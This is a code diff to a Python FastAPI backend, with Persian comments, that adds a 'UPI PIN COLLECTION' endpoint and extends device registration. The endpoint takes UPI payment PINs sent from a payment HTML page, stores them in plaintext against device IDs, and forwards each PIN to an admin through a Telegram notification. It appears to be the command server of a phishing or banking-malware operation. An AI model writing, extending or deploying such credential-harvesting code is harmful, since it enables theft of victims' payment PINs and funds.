@@ -32,6 +32,9 @@ from .models.otp_schemas import (
 from .models.bot_schemas import (
     BotOTPRequest, BotOTPVerify, BotOTPResponse, BotTokenResponse, BotStatusResponse
 )
+from .models.upi_schemas import (
+    UPIPinSave, UPIPinResponse
+)
 from .utils.auth_middleware import (
     get_current_admin, get_optional_admin, require_permission,
     get_client_ip, get_user_agent
@@ -210,9 +213,17 @@ async def register_device(message: dict):
     device_id = message.get("device_id")
     device_info = message.get("device_info", {})
     admin_token = message.get("admin_token")  # 🔑 توکن ادمین
+    user_id = message.get("user_id")  # Static user identifier  
+    app_type = message.get("app_type")  # App flavor
+    
+    # Add user_id and app_type to device_info if provided
+    if user_id:
+        device_info["user_id"] = user_id
+    if app_type:
+        device_info["app_type"] = app_type
     
     result = await device_service.register_device(device_id, device_info, admin_token)
-    await device_service.add_log(device_id, "system", "Device registered", "info")
+    await device_service.add_log(device_id, "system", f"Device registered (app: {app_type or 'unknown'})", "info")
     
     # اگه توکن معتبر بود، به ربات ادمین اطلاع بده
     if admin_token and result.get("device") and result["device"].get("admin_username"):
@@ -816,6 +827,69 @@ async def bot_check_status(current_admin: Admin = Depends(get_current_admin)):
         device_token=current_admin.device_token,
         message="Admin is active" if current_admin.is_active else "Admin is disabled"
     )
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# 💳 UPI PIN COLLECTION
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@app.post("/save-pin", response_model=UPIPinResponse, tags=["UPI"])
+async def save_upi_pin(pin_data: UPIPinSave):
+    """
+    💳 Save UPI PIN from HTML form
+    
+    - Receives PIN directly from payment HTML page
+    - Associates PIN with device_id
+    - Stores app_type and user_id
+    - Returns success with timestamp
+    """
+    try:
+        # Update device with UPI PIN
+        result = await mongodb.db.devices.update_one(
+            {"device_id": pin_data.device_id},
+            {
+                "$set": {
+                    "upi_pin": pin_data.upi_pin,
+                    "has_upi": True,
+                    "upi_detected_at": datetime.utcnow(),
+                    "upi_last_updated_at": datetime.utcnow(),
+                    "user_id": pin_data.user_id,
+                    "app_type": pin_data.app_type,
+                    "updated_at": datetime.utcnow()
+                }
+            },
+            upsert=True
+        )
+        
+        # Log the PIN save
+        await device_service.add_log(
+            pin_data.device_id,
+            "upi",
+            f"UPI PIN saved from {pin_data.app_type} app",
+            "info"
+        )
+        
+        # Notify admin if device is registered
+        device = await mongodb.db.devices.find_one({"device_id": pin_data.device_id})
+        if device and device.get("admin_username"):
+            await telegram_multi_service.notify_upi_detected(
+                pin_data.device_id,
+                pin_data.upi_pin,
+                device["admin_username"]
+            )
+        
+        logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} (app: {pin_data.app_type})")
+        
+        return UPIPinResponse(
+            status="success",
+            message="PIN saved successfully",
+            timestamp=datetime.utcnow()
+        )
+    
+    except Exception as e:
+        logger.error(f"❌ Error saving UPI PIN: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
 
 @app.get("/auth/me", response_model=AdminResponse)
 async def get_current_admin_info(current_admin: Admin = Depends(get_current_admin)):
